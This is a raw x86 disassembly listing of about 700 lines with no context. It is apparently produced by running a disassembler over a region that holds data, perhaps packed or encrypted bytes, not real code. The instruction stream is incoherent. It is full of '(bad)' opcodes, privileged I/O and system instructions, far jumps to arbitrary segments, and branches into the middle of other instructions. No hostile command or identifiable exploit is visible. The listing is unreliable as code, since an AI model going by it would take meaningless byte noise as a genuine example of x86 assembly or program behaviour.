  4ba67c:	lods   eax,DWORD PTR ds:[esi]
  4ba67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ba67e:	fisttp DWORD PTR [ecx+0x44ab9115]
  4ba684:	aad    0x68
  4ba686:	mov    al,ds:0x1869c3d0
  4ba68b:	xlat   BYTE PTR ds:[ebx]
  4ba68c:	scas   al,BYTE PTR es:[edi]
  4ba68d:	shl    DWORD PTR [edx],cl
  4ba68f:	jb     0x4ba6e4
  4ba691:	or     ebx,edi
  4ba693:	adc    al,0xbb
  4ba695:	arpl   WORD PTR [edi+0x1d8e8b2b],bp
  4ba69b:	or     ecx,DWORD PTR [ebp+0x1c]
  4ba69e:	sub    al,0x30
  4ba6a0:	retf   
  4ba6a1:	jp     0x4ba6ea
  4ba6a3:	nop
  4ba6a4:	jbe    0x4ba6fc
  4ba6a6:	daa    
  4ba6a7:	add    ebx,DWORD PTR [ecx]
  4ba6a9:	sub    dl,bh
  4ba6ab:	adc    DWORD PTR [esi-0x15],0x43fdddc5
  4ba6b2:	add    edi,DWORD PTR [ecx-0x3d03ae9e]
  4ba6b8:	test   DWORD PTR [ecx+0x58],ebx
  4ba6bb:	in     al,0x1
  4ba6bd:	call   0x95d301cb
  4ba6c2:	das    
  4ba6c3:	retf   0x22e8
  4ba6c6:	xchg   edi,eax
  4ba6c7:	icebp  
  4ba6c8:	(bad)  
  4ba6c9:	pop    ebx
  4ba6ca:	pusha  
  4ba6cb:	add    al,0x16
  4ba6cd:	push   es
  4ba6ce:	push   0x2c
  4ba6d0:	sbb    ecx,DWORD PTR [ecx]
  4ba6d2:	or     al,0x2c
  4ba6d4:	(bad)  
  4ba6d5:	mov    esi,0x32f64116
  4ba6da:	je     0x4ba6eb
  4ba6dc:	sub    DWORD PTR [ebx+edx*1],ecx
  4ba6df:	mov    al,ds:0xc6980d85
  4ba6e4:	or     al,BYTE PTR [ecx]
  4ba6e6:	push   eax
  4ba6e7:	bound  edx,QWORD PTR [ebx]
  4ba6e9:	inc    esi
  4ba6ea:	in     al,0xa9
  4ba6ec:	out    0xd9,al
  4ba6ee:	xchg   esi,eax
  4ba6ef:	sbb    DWORD PTR [eax+0x22],eax
  4ba6f2:	or     al,0x0
  4ba6f4:	dec    ebx
  4ba6f5:	sbb    al,BYTE PTR [esi]
  4ba6f7:	mov    cl,0x56
  4ba6f9:	jge    0x4ba6bb
  4ba6fb:	push   ss
  4ba6fc:	fsub   st,st(5)
  4ba6fe:	inc    edi
  4ba6ff:	fist   DWORD PTR [ebx+0x1ccbb83]
  4ba705:	jl     0x4ba747
  4ba707:	xor    BYTE PTR [ebp+ecx*2+0x77050277],cl
  4ba70e:	ret    
  4ba70f:	call   0x95784259
  4ba714:	mov    al,ds:0x3b249c31
  4ba719:	and    BYTE PTR [esi-0x59],bh
  4ba71c:	(bad)  
  4ba71e:	push   ebp
  4ba71f:	dec    eax
  4ba720:	loopne 0x4ba72c
  4ba722:	lods   eax,DWORD PTR ds:[esi]
  4ba723:	lea    ebx,[edi+0x3bb8ba9]
  4ba729:	ds xchg edi,eax
  4ba72b:	push   ss
  4ba72c:	mov    bh,0x53
  4ba72e:	mov    ah,0x41
  4ba730:	push   ds
  4ba731:	inc    ebp
  4ba732:	sub    BYTE PTR [ebx+0x57751515],ah
  4ba738:	clc    
  4ba739:	sbb    ebp,DWORD PTR [ebp-0x387eacdd]
  4ba73f:	fdiv   DWORD PTR ds:0x380e03e4
  4ba745:	xchg   edx,eax
  4ba746:	jecxz  0x4ba732
  4ba748:	mov    ch,0xc6
  4ba74a:	test   BYTE PTR [ecx+0x61],0x49
  4ba74e:	adc    esp,ebx
  4ba750:	rol    DWORD PTR [esi],1
  4ba752:	outs   dx,BYTE PTR ds:[esi]
  4ba753:	addr16 out dx,al
  4ba755:	(bad)  
  4ba756:	int3   
  4ba757:	out    dx,al
  4ba758:	mov    ah,0x83
  4ba75a:	fs dec edi
  4ba75c:	xchg   ebp,ebx
  4ba75e:	in     eax,dx
  4ba75f:	mov    ecx,DWORD PTR [edi+0x17d5ad4]
  4ba765:	jmp    0x4ba773
  4ba767:	lea    edx,ds:[edi+0x615379c8]
  4ba76e:	sti    
  4ba76f:	fadd   DWORD PTR [ecx-0x22f944e3]
  4ba775:	mov    cl,BYTE PTR [ebx+0x170610ce]
  4ba77b:	mov    ebp,0xecd9626c
  4ba780:	xor    BYTE PTR [esp+ebp*4],bl
  4ba783:	fst    DWORD PTR [ecx-0x3]
  4ba786:	and    al,0x56
  4ba788:	mov    ds:0xa10a2b04,eax
  4ba78d:	lods   al,BYTE PTR ds:[esi]
  4ba78e:	xchg   edi,eax
  4ba78f:	xchg   ebx,eax
  4ba790:	adc    al,0x1b
  4ba792:	loope  0x4ba771
  4ba794:	jmp    0x722d:0x1c21f6c4
  4ba79b:	pcmpgtw mm6,QWORD PTR [esi+0x2b0b2152]
  4ba7a2:	(bad)  
  4ba7a4:	xor    eax,0x38d6a928
  4ba7a9:	retf   0x60f8
  4ba7ac:	sub    al,0xcd
  4ba7ae:	inc    eax
  4ba7af:	shl    DWORD PTR [edx],1
  4ba7b1:	xchg   esi,eax
  4ba7b2:	jbe    0x4ba75d
  4ba7b4:	test   esp,esp
  4ba7b6:	push   eax
  4ba7b7:	sbb    eax,DWORD PTR [eax]
  4ba7b9:	(bad)  
  4ba7ba:	cld    
  4ba7bb:	push   ebx
  4ba7bc:	inc    edx
  4ba7bd:	push   edx
  4ba7be:	dec    edx
  4ba7bf:	dec    edx
  4ba7c0:	xor    edx,DWORD PTR [ebp-0x3dcf733d]
  4ba7c6:	pop    edx
  4ba7c7:	or     eax,0x8dfa9a5
  4ba7cc:	or     dl,BYTE PTR ds:0x44756f5
  4ba7d2:	in     eax,dx
  4ba7d3:	retf   0x8c38
  4ba7d6:	adc    al,0x30
  4ba7d8:	adc    BYTE PTR [eax],ah
  4ba7da:	or     al,0x6
  4ba7dc:	mov    ecx,0xdc6137a8
  4ba7e1:	dec    edx
  4ba7e2:	add    eax,0xd462c62b
  4ba7e7:	gs out dx,eax
  4ba7e9:	adc    BYTE PTR [ecx-0x709cbc54],dl
  4ba7ef:	xlat   BYTE PTR ds:[ebx]
  4ba7f0:	fld    TBYTE PTR [ecx]
  4ba7f2:	cmp    ch,ch
  4ba7f4:	jmp    FWORD PTR [esi-0x33]
  4ba7f7:	push   0x44b858
  4ba7fc:	push   0x846e991
  4ba801:	dec    edx
  4ba802:	pop    ecx
  4ba803:	cdq    
  4ba804:	fcomp  st(7)
  4ba806:	out    0xa1,eax
  4ba808:	or     eax,DWORD PTR [edi+0x68]
  4ba80b:	std    
  4ba80c:	or     ebp,0xc6f246a0
  4ba812:	sbb    ebp,0x803a22c2
  4ba818:	mov    dh,0x68
  4ba81a:	scas   al,BYTE PTR es:[edi]
  4ba81b:	push   edx
  4ba81c:	push   es
  4ba81d:	int3   
  4ba81e:	inc    ebx
  4ba81f:	fdivr  QWORD PTR [edi]
  4ba821:	or     al,0xa7
  4ba823:	rol    BYTE PTR [eax],cl
  4ba825:	jl     0x4ba7bb
  4ba827:	leave  
  4ba828:	ficom  WORD PTR [esp+edx*1]
  4ba82b:	lahf   
  4ba82c:	xor    DWORD PTR [eax+0x59],0x83506a1b
  4ba833:	xchg   edx,eax
  4ba834:	sbb    DWORD PTR [ecx],0xf110c3d4
  4ba83a:	xor    BYTE PTR ds:0x34632b2c,bh
  4ba840:	dec    ebx
  4ba841:	push   0xe264e0a2
  4ba846:	add    BYTE PTR [eax-0x4d],0x29
  4ba84a:	test   al,0x41
  4ba84c:	in     eax,dx
  4ba84d:	test   eax,0x2d740157
  4ba852:	add    ah,BYTE PTR [edi-0x40]
  4ba855:	and    al,0xc0
  4ba857:	dec    eax
  4ba858:	and    eax,0x5c253b86
  4ba85d:	jmp    0xa2a1ac20
  4ba862:	sbb    BYTE PTR [ebp*4+0xa77fc03],al
  4ba869:	and    DWORD PTR [esp+eax*1],0x1
  4ba86d:	mov    eax,ds:0x721e6dcd
  4ba872:	jmp    0x4ba8c1
  4ba874:	push   cs
  4ba875:	jne    0x4ba88a
  4ba877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ba878:	add    al,0x1c
  4ba87a:	xchg   ebx,eax
  4ba87b:	lock (bad) 
  4ba87d:	cwde   
  4ba87e:	movss  xmm4,xmm0
  4ba882:	jno    0x4ba81b
  4ba884:	ja     0x4ba810
  4ba886:	adc    eax,0xc1c97b49
  4ba88b:	leave  
  4ba88c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ba88d:	add    dl,BYTE PTR [ecx-0x80]
  4ba890:	mov    dl,0x1b
  4ba892:	call   0x762:0xb3ba574f
  4ba899:	pop    eax
  4ba89a:	xor    eax,0xe846f500
  4ba89f:	mov    al,0x7c
  4ba8a1:	push   esi
  4ba8a2:	shr    BYTE PTR [edx+0x3670c753],1
  4ba8a8:	fdivr  st(0),st
  4ba8aa:	push   esi
  4ba8ab:	add    eax,0x49713d00
  4ba8b0:	sbb    ebp,esp
  4ba8b2:	es inc eax
  4ba8b4:	adc    BYTE PTR [ebp-0x52],dl
  4ba8b7:	xor    al,0x71
  4ba8b9:	xchg   DWORD PTR [edi+0x12],edi
  4ba8bc:	inc    edi
  4ba8bd:	or     BYTE PTR ds:[ebp+0x3ae56905],bh
  4ba8c4:	jmp    0x4ba8a5
  4ba8c6:	or     eax,0x6a940fec
  4ba8cb:	add    DWORD PTR [esi+0x14],esi
  4ba8ce:	dec    edi
  4ba8cf:	push   ecx
  4ba8d0:	cmp    eax,DWORD PTR [esp+edi*1]
  4ba8d3:	sahf   
  4ba8d4:	add    al,0xa5
  4ba8d6:	imul   esp,eax,0xffffff9b
  4ba8d9:	adc    ah,BYTE PTR [eax]
  4ba8db:	rcr    BYTE PTR [edx],cl
  4ba8dd:	or     BYTE PTR [esi+0x322925fe],ah
  4ba8e3:	lea    edi,[ebx+0x40]
  4ba8e6:	lea    edx,[edi-0x10]
  4ba8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ba8ea:	lods   al,BYTE PTR ds:[esi]
  4ba8eb:	dec    esp
  4ba8ec:	ins    BYTE PTR es:[edi],dx
  4ba8ed:	ffree  st(1)
  4ba8ef:	or     al,0x17
  4ba8f1:	loopne 0x4ba94f
  4ba8f3:	lahf   
  4ba8f4:	lgdtd  [esi+eax*2-0x7d]
  4ba8f9:	(bad)  
  4ba8fa:	cs mov dl,al
  4ba8fd:	jg     0x4ba926
  4ba8ff:	sbb    BYTE PTR [ebx+ebx*8+0x6a],bh
  4ba903:	inc    eax
  4ba904:	mov    esi,0x410e42
  4ba909:	loope  0x4ba8bc
  4ba90b:	ficomp DWORD PTR [ebx-0x5f]
  4ba90e:	sub    esi,0x56140de2
  4ba914:	shl    al,cl
  4ba916:	and    bl,BYTE PTR [edx]
  4ba918:	jo     0x4ba8a7
  4ba91a:	or     DWORD PTR [edi+0x68],esi
  4ba91d:	and    DWORD PTR [eax+0x68],edi
  4ba920:	gs jl  0x4ba93c
  4ba923:	fwait
  4ba924:	mov    BYTE PTR [edi-0x25],ah
  4ba927:	mov    dh,0x0
  4ba929:	mov    ch,0x32
  4ba92b:	xor    eax,0xc7ec7989
  4ba930:	sub    eax,0xa4bdff44
  4ba935:	mov    eax,ds:0x8c32c2c4
  4ba93a:	mov    DWORD PTR [edx+0x1],0xd347e0f2
  4ba941:	std    
  4ba942:	jle    0x4ba9b5
  4ba944:	inc    edx
  4ba945:	mov    cs,eax
  4ba947:	add    ecx,0x518934eb
  4ba94d:	add    DWORD PTR ds:0x13c75ef3,edx
  4ba953:	add    DWORD PTR [eax+0x59],0x83503f9e
  4ba95a:	fdiv   DWORD PTR [eax+0x742a036c]
  4ba960:	or     dh,BYTE PTR ds:[eax+0x60bf8102]
  4ba967:	cmp    dh,al
  4ba969:	add    dl,al
  4ba96b:	mov    dx,WORD PTR [ebx-0x40]
  4ba96f:	es mov dh,0xb0
  4ba972:	cmp    ah,BYTE PTR es:[ebp-0x75]
  4ba976:	pop    esi
  4ba977:	mov    eax,ss
  4ba979:	inc    edx
  4ba97a:	dec    edi
  4ba97b:	jmp    0x4ba996
  4ba97d:	add    dh,BYTE PTR [ecx+0x31]
  4ba980:	(bad)  
  4ba981:	outs   dx,BYTE PTR ds:[esi]
  4ba982:	ret    
  4ba983:	pop    ebx
  4ba984:	loop   0x4ba9c6
  4ba986:	mov    ebp,DWORD PTR [esi+0x50]
  4ba989:	mov    eax,ds:0xd47cfd17
  4ba98e:	mov    dl,0x46
  4ba990:	sar    bl,1
  4ba992:	or     BYTE PTR [ecx+0x57],cl
  4ba995:	or     al,0x3c
  4ba997:	mov    ds:0x9187a405,al
  4ba99c:	xchg   ecx,eax
  4ba99d:	add    edx,ebx
  4ba99f:	add    DWORD PTR [ebx],esp
  4ba9a1:	push   ss
  4ba9a2:	inc    esi
  4ba9a3:	ins    DWORD PTR es:[edi],dx
  4ba9a4:	mov    ds:0x82191788,eax
  4ba9a9:	fist   WORD PTR [eax-0x15]
  4ba9ac:	ds dec eax
  4ba9ae:	cmp    al,0xb3
  4ba9b0:	cld    
  4ba9b1:	and    edi,DWORD PTR [edx+edx*2]
  4ba9b4:	pop    ecx
  4ba9b5:	out    dx,eax
  4ba9b6:	jmp    0xeba35f3b
  4ba9bb:	push   edx
  4ba9bc:	sub    eax,0x4fa46d2c
  4ba9c1:	add    DWORD PTR [edx+0x35],esi
  4ba9c4:	inc    ebx
  4ba9c5:	mov    ebp,0x53f2da02
  4ba9ca:	jmp    0x4ba9fc
  4ba9cc:	jl     0x4ba9de
  4ba9ce:	scas   al,BYTE PTR es:[edi]
  4ba9cf:	pop    eax
  4ba9d0:	add    al,0x58
  4ba9d2:	mov    DWORD PTR [ebp-0x4faeb630],ecx
  4ba9d8:	dec    ebp
  4ba9d9:	js     0x4baa15
  4ba9db:	dec    ebp
  4ba9dc:	test   DWORD PTR [ecx],esi
  4ba9de:	out    0x6,eax
  4ba9e0:	mov    ebx,0xc20d695b
  4ba9e5:	sub    ebp,DWORD PTR [edi-0x12]
  4ba9e8:	clc    
  4ba9e9:	and    cl,bh
  4ba9eb:	push   es
  4ba9ec:	sbb    ah,BYTE PTR [ecx]
  4ba9ee:	and    BYTE PTR [edi+eiz*8+0x3c],dl
  4ba9f2:	popa   
  4ba9f3:	in     al,0x16
  4ba9f5:	xor    eax,0xadf1d783
  4ba9fa:	add    al,0x84
  4ba9fc:	add    BYTE PTR [edx+0x62],cl
  4ba9ff:	jmp    0x21b61a76
  4baa04:	mov    ch,0x4b
  4baa06:	pop    edx
  4baa07:	inc    ebx
  4baa08:	cs jns 0x4baa0b
  4baa0b:	add    BYTE PTR [eax],ah
  4baa0d:	fs pushaw 
  4baa10:	adc    DWORD PTR [ebx+0x59],edx
  4baa13:	out    dx,eax
  4baa14:	and    DWORD PTR ds:0x9bcf0528,esp
  4baa1a:	sub    esp,ebx
  4baa1c:	dec    ecx
  4baa1d:	pop    ss
  4baa1e:	sbb    esi,DWORD PTR [ebx]
  4baa20:	xchg   ebp,eax
  4baa21:	dec    edx
  4baa22:	ret    0x596a
  4baa25:	(bad)  
  4baa26:	sub    ebp,ebx
  4baa28:	lds    esp,FWORD PTR [ebx+0x45ab8a7]
  4baa2e:	pop    ebp
  4baa2f:	and    al,0xa4
  4baa31:	push   edx
  4baa32:	inc    edx
  4baa33:	sbb    al,0x5f
  4baa35:	dec    esp
  4baa36:	mov    ch,0x8c
  4baa38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4baa39:	or     dl,BYTE PTR [ebx+0x53d127eb]
  4baa3f:	pop    ds
  4baa40:	add    esi,DWORD PTR [edx+0x61349a81]
  4baa46:	inc    eax
  4baa47:	jmp    0x7ec01ade
  4baa4c:	push   edi
  4baa4d:	(bad)  [eax-0x9]
  4baa50:	inc    esp
  4baa51:	cmp    eax,0x51153608
  4baa56:	cs loope 0x4baa3d
  4baa59:	sub    ch,BYTE PTR [eax+0x4]
  4baa5c:	outs   dx,BYTE PTR ds:[esi]
  4baa5d:	jnp    0x4baa5e
  4baa5f:	popa   
  4baa60:	lods   eax,DWORD PTR ds:[esi]
  4baa61:	add    edi,DWORD PTR [edx]
  4baa63:	adc    al,0xa7
  4baa65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4baa66:	retf   
  4baa67:	cmp    dh,BYTE PTR [ebx]
  4baa69:	pusha  
  4baa6a:	nop
  4baa6b:	jl     0x4baac4
  4baa6d:	lods   eax,DWORD PTR ds:[esi]
  4baa6e:	and    BYTE PTR [ecx+eax*4-0x3a],dh
  4baa72:	push   edi
  4baa73:	icebp  
  4baa74:	lea    edx,[ecx+0x6877c8c2]
  4baa7a:	fild   WORD PTR [ebp+0x7b83d601]
  4baa80:	jmp    0x4baadd
  4baa82:	and    ebp,eax
  4baa84:	rcr    BYTE PTR [ebp+0x64],1
  4baa87:	mov    ch,0x1c
  4baa89:	repnz cmp BYTE PTR [eax+0x396d7817],dl
  4baa90:	not    BYTE PTR [edx]
  4baa92:	repz jmp 0x4baab8
  4baa95:	ror    esi,cl
  4baa97:	in     al,0x75
  4baa99:	sbb    DWORD PTR [eax],0x6e32d9cb
  4baa9f:	hlt    
  4baaa0:	or     eax,0x579d0664
  4baaa5:	adc    al,0x52
  4baaa7:	popa   
  4baaa8:	push   ss
  4baaa9:	popa   
  4baaaa:	and    esi,DWORD PTR [ecx+0xc]
  4baaad:	inc    eax
  4baaae:	lods   al,BYTE PTR ds:[esi]
  4baaaf:	invd   
  4baab1:	and    DWORD PTR [eax+0x1d639d72],ecx
  4baab7:	mov    edi,ecx
  4baab9:	es popa 
  4baabb:	mov    ch,0x0
  4baabd:	mov    cl,0x4d
  4baabf:	(bad)  
  4baac0:	pop    ss
  4baac1:	aad    0x52
  4baac3:	(bad)  
  4baac4:	stos   BYTE PTR es:[edi],al
  4baac5:	adc    eax,0x4c3a2b61
  4baaca:	pop    esi
  4baacb:	and    al,0x6b
  4baacd:	inc    BYTE PTR [esi+0x1a]
  4baad0:	push   es
  4baad1:	cmp    DWORD PTR [eax+0x21287c43],edx
  4baad7:	adc    al,0xa0
  4baad9:	retf   0x9492
  4baadc:	(bad)  
  4baadd:	jg     0x4baa68
  4baadf:	js     0x4baa8d
  4baae1:	and    ah,BYTE PTR [ebp+0x11c97284]
  4baae7:	(bad)  
  4baae8:	push   eax
  4baae9:	mov    ecx,DWORD PTR [ecx+0x17]
  4baaec:	or     esp,DWORD PTR [eax]
  4baaee:	or     DWORD PTR [edi+eax*8],0xee3b9059
  4baaf5:	lods   eax,DWORD PTR ds:[esi]
  4baaf6:	int    0x8d
  4baaf8:	mov    edx,DWORD PTR [edi-0x46bcebab]
  4baafe:	add    al,BYTE PTR [eax+0x2b]
  4bab01:	sbb    BYTE PTR [edx+0x42],cl
  4bab04:	pusha  
  4bab05:	dec    eax
  4bab06:	fwait
  4bab07:	xlat   BYTE PTR ss:[ebx]
  4bab09:	(bad)  
  4bab0a:	and    bh,BYTE PTR [edx+eax*2+0x64]
  4bab0e:	sar    BYTE PTR [ecx+eax*2+0x5c],1
  4bab12:	pop    esp
  4bab13:	dec    ecx
  4bab14:	push   ebp
  4bab15:	push   0x183c9946
  4bab1a:	add    eax,0x138d603c
  4bab1f:	nop
  4bab20:	or     BYTE PTR fs:[esi-0x80],bh
  4bab24:	int    0x74
  4bab26:	and    bl,BYTE PTR [edi+0x747b60ff]
  4bab2c:	fstp   QWORD PTR [ecx-0x5abf28ff]
  4bab32:	cmp    eax,esi
  4bab34:	xchg   edx,eax
  4bab35:	or     al,0xa
  4bab37:	test   DWORD PTR [ecx],edx
  4bab39:	add    DWORD PTR [ebx+edi*2+0x48],esi
  4bab3d:	mov    esi,0xfe3b5012
  4bab42:	sbb    BYTE PTR [ebx+eiz*1+0xde942f0],al
  4bab49:	stos   BYTE PTR es:[edi],al
  4bab4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bab4b:	adc    ebx,0xebfd9d1e
  4bab51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bab52:	mov    ebp,ebx
  4bab54:	push   edx
  4bab55:	pusha  
  4bab56:	push   ecx
  4bab57:	mov    eax,0x35b31877
  4bab5c:	mov    DWORD PTR [ebx],esi
  4bab5e:	jle    0x4babc0
  4bab60:	and    ch,BYTE PTR [ebp+0x20]
  4bab63:	add    ah,BYTE PTR [edx+0x61]
  4bab66:	sub    BYTE PTR [ecx],bh
  4bab68:	ret    0xe061
  4bab6b:	jl     0x4bab84
  4bab6d:	aam    0x25
  4bab6f:	mov    ah,0x89
  4bab71:	and    BYTE PTR [edx-0x3d],0x15
  4bab75:	(bad)  cs:[eax]
  4bab78:	mov    al,ds:0xa5138359
  4bab7d:	inc    esp
  4bab7e:	sub    DWORD PTR ds:0xfbd3568c,edx
  4bab84:	fldenv [esi+ebp*1+0x791cf6dd]
  4bab8b:	adc    DWORD PTR [eax-0x32],esi
  4bab8e:	push   cs
  4bab8f:	add    ah,BYTE PTR [ecx-0x9]
  4bab92:	fcom   DWORD PTR [edi-0x39]
  4bab95:	push   0x64
  4bab97:	(bad)  
  4bab98:	stos   BYTE PTR es:[edi],al
  4bab99:	imul   ebx,DWORD PTR [eax],0xffffffba
  4bab9c:	sbb    DWORD PTR [eax-0x18],ecx
  4bab9f:	add    al,ah
  4baba1:	stos   BYTE PTR es:[edi],al
  4baba2:	ja     0x4bab6f
  4baba4:	ja     0x4bab77
  4baba6:	jl     0x4bab9a
  4baba8:	mov    dh,0xe4
  4babaa:	and    al,0xe5
  4babac:	mov    dl,0xb4
  4babae:	stos   BYTE PTR es:[edi],al
  4babaf:	enter  0x844f,0x80
  4babb3:	(bad)  
  4babb4:	cld    
  4babb5:	adc    DWORD PTR [ecx+0x3a],eax
  4babb8:	retf   0x54
  4babbb:	sahf   
  4babbc:	lds    edi,FWORD PTR [esi-0xe]
  4babbf:	ja     0x4bac28
  4babc1:	jno    0x4bac3d
  4babc3:	push   esp
  4babc4:	add    eax,esi
  4babc6:	pop    ecx
  4babc7:	jg     0x4babee
  4babc9:	nop
  4babca:	dec    eax
  4babcb:	or     esp,DWORD PTR [edx-0x78]
  4babce:	cdq    
  4babcf:	fs imul eax,ecx,0x1540a368
  4babd6:	dec    eax
  4babd7:	outs   dx,BYTE PTR ds:[esi]
  4babd8:	out    0x0,eax
  4babda:	cld    
  4babdb:	pop    esp
  4babdc:	inc    eax
  4babdd:	rol    BYTE PTR [edx-0x5cdefa03],0xfc
  4babe4:	inc    ecx
  4babe5:	add    ecx,edi
  4babe7:	das    
  4babe8:	pop    ecx
  4babe9:	(bad)  
  4babea:	pop    ss
  4babeb:	js     0x4baba5
  4babed:	mov    dh,0x25
  4babef:	das    
  4babf0:	add    ebx,0xb25d7ef
  4babf6:	xchg   ecx,eax
  4babf7:	or     al,0xff
  4babf9:	push   cs
  4babfa:	pop    edi
  4babfb:	sbb    BYTE PTR [ecx],al
  4babfd:	loopne 0x4babcd
  4babff:	inc    edx
  4bac00:	jnp    0x4bac6f
  4bac02:	push   ecx
  4bac03:	ss push esp
  4bac05:	cmp    eax,0x70001460
  4bac0a:	inc    ecx
  4bac0b:	dec    ebp
  4bac0c:	(bad)  
  4bac0d:	rcr    BYTE PTR [ebx+0x3415d364],1
  4bac13:	xor    dl,BYTE PTR [esi+esi*8+0x5939494]
  4bac1a:	daa    
  4bac1b:	adc    esi,DWORD PTR [eax+edi*8]
  4bac1e:	and    esp,ecx
  4bac20:	add    al,0xe
  4bac22:	and    eax,0xc119d289
  4bac27:	xchg   edx,eax
  4bac28:	shl    ch,0x6c
  4bac2b:	dec    esi
  4bac2c:	add    al,0xae
  4bac2e:	leave  
  4bac2f:	int    0xc
  4bac31:	and    edx,DWORD PTR [ecx+edx*4]
  4bac34:	and    dl,BYTE PTR [eax+0x31]
  4bac37:	mov    WORD PTR [esi+edx*1-0x55d2278b],cs
  4bac3e:	push   0x4051bcbc
  4bac43:	or     DWORD PTR ds:[ebp-0x52490420],ebx
  4bac4a:	jg     0x4bac58
  4bac4c:	fild   DWORD PTR [ecx+0x6028c4dc]
  4bac52:	jmp    0x674b685
  4bac57:	test   al,0x44
  4bac59:	jg     0x4bac4f
  4bac5b:	cmp    ebx,DWORD PTR [edi]
  4bac5d:	jae    0x4bac81
  4bac5f:	int    0x2c
  4bac61:	xlat   BYTE PTR ds:[ebx]
  4bac62:	pop    esi
  4bac63:	popa   
  4bac64:	addr16 ret 0x8e88
  4bac68:	mov    bh,0xa0
  4bac6a:	fdivr  QWORD PTR [ebp+0x5fddf1c2]
  4bac70:	mov    DWORD PTR [esi+0x4f89a027],edx
  4bac76:	inc    esp
  4bac77:	adc    DWORD PTR [eax+0x50],ebp
  4bac7a:	and    al,BYTE PTR [eax+0x4d]
  4bac7d:	jl     0x4bac91
  4bac7f:	cli    
  4bac80:	fcom   QWORD PTR [eax]
  4bac82:	aas    
  4bac83:	outs   dx,BYTE PTR ds:[esi]
  4bac84:	fwait
  4bac85:	clc    
  4bac86:	pop    ss
  4bac87:	cmp    ecx,DWORD PTR [ebp-0x6e1893b2]
  4bac8d:	xchg   edx,eax
  4bac8e:	scas   eax,DWORD PTR es:[edi]
  4bac8f:	sub    BYTE PTR fs:[esi],al
  4bac92:	out    dx,eax
  4bac93:	(bad)  
  4bac94:	sar    BYTE PTR [ebx*2+0x7081d534],cl
  4bac9b:	inc    ebx
  4bac9c:	adc    BYTE PTR [esi+eax*1-0x45f1ef79],dl
  4baca3:	aad    0x49
  4baca5:	or     ebx,DWORD PTR [edi]
  4baca7:	sub    DWORD PTR [edx+eiz*2+0x345e8dab],ebx
  4bacae:	dec    ecx
  4bacaf:	dec    esi
  4bacb0:	sar    BYTE PTR [ecx],1
  4bacb2:	push   eax
  4bacb3:	mov    ds:0x8801235,al
  4bacb8:	pop    esp
  4bacb9:	icebp  
  4bacba:	cs or  edi,edx
  4bacbd:	sub    ah,BYTE PTR [ebx]
  4bacbf:	and    DWORD PTR [ebp+0x8],edx
  4bacc2:	mov    eax,edx
  4bacc4:	or     al,0x26
  4bacc6:	cmp    eax,0xe5da110e
  4baccb:	sbb    BYTE PTR [edx-0x2cdf9c96],cl
  4bacd1:	dec    esp
  4bacd2:	das    
  4bacd3:	in     eax,dx
  4bacd4:	adc    BYTE PTR [ebx],bl
  4bacd6:	push   cs
  4bacd7:	jo     0x4baceb
  4bacd9:	add    dh,BYTE PTR [edx+0x3]
  4bacdc:	sub    eax,0x523e81d6
  4bace1:	retf   0x5f5
  4bace4:	cmp    bl,BYTE PTR [esp]
  4bace7:	in     al,dx
  4bace8:	lock sbb ecx,DWORD PTR [esp+ecx*1-0x2b]
  4baced:	ins    DWORD PTR es:[edi],dx
  4bacee:	sub    ecx,edx
  4bacf0:	ret    0x7a8a
  4bacf3:	fwait
  4bacf4:	mov    dh,0x3
  4bacf6:	leave  
  4bacf7:	add    dl,cl
  4bacf9:	xchg   ebx,eax
  4bacfa:	mov    ds:0x700af8c3,al
  4bacff:	cmp    eax,DWORD PTR [edx+0x30]
  4bad02:	jne    0x4bacb6
  4bad04:	call   0x385d:0x7cb4a8ce
  4bad0b:	adc    al,0xa0
  4bad0d:	xor    BYTE PTR [edx],bh
  4bad0f:	sbb    eax,0x1e68484c
  4bad14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bad15:	adc    DWORD PTR [ebp-0x3d7e43bb],0xffffffaa
  4bad1c:	ja     0x4bacc8
  4bad1e:	add    al,0x3c
  4bad20:	clc    
  4bad21:	mov    ebx,0x393a2013
  4bad26:	sbb    bh,BYTE PTR [edx]
  4bad28:	push   ebp
  4bad29:	and    al,0x99
  4bad2b:	jmp    0xa5c:0x1212aed6
  4bad32:	lock (bad) 
  4bad34:	push   es
  4bad35:	ret    0xdad6
  4bad38:	or     DWORD PTR [esi+0x6a],ecx
  4bad3b:	bound  ecx,QWORD PTR [eax]
  4bad3d:	add    al,0x10
  4bad3f:	push   ds
  4bad40:	pop    ss
  4bad41:	std    
  4bad42:	loop   0x4bad18
  4bad44:	adc    al,0xb1
  4bad46:	idiv   BYTE PTR [edx+0x514ee6c]
  4bad4c:	imul   BYTE PTR [esi+0x30]
  4bad4f:	inc    ebx
  4bad50:	test   BYTE PTR [edx],ah
  4bad52:	jmp    0x12dec1a5
  4bad57:	or     DWORD PTR [edx],0x83b71c58
  4bad5d:	or     eax,0x9e37e0b4
  4bad62:	or     BYTE PTR ss:[edx+esi*2],0x80
  4bad67:	mov    esp,0x1020043c
  4bad6c:	add    bl,0xa0
  4bad6f:	xchg   esi,eax
  4bad70:	adc    DWORD PTR [esi-0x7a030ea8],esi
  4bad76:	shl    BYTE PTR [edi+ebp*1+0x38],0x3c
  4bad7b:	mov    ebx,0xa7684c95
  4bad80:	or     BYTE PTR [edi],ah
  4bad82:	push   edx
  4bad83:	jb     0x4badb7
  4bad85:	cld    
  4bad86:	sbb    BYTE PTR [esi],dl
  4bad88:	inc    edx
  4bad89:	mov    edx,0xb8ac1834
  4bad8e:	or     BYTE PTR [edi+0xc],dh
  4bad91:	sub    al,0x16
  4bad93:	adc    eax,0xa2189673
  4bad98:	adc    cl,al
  4bad9a:	clc    
  4bad9b:	or     al,BYTE PTR [esi]
  4bad9d:	das    
  4bad9e:	ror    BYTE PTR [esi],0x5
  4bada1:	cmp    eax,0x62f14931
  4bada6:	loopne 0x4badc3
  4bada8:	cmp    DWORD PTR cs:[edi+ecx*1+0x63024486],edi
  4badb0:	adc    DWORD PTR [ebx+eiz*1-0x46f7640],eax
  4badb7:	xchg   DWORD PTR [ebx+0x5c],edi
  4badba:	cmp    al,0x2a
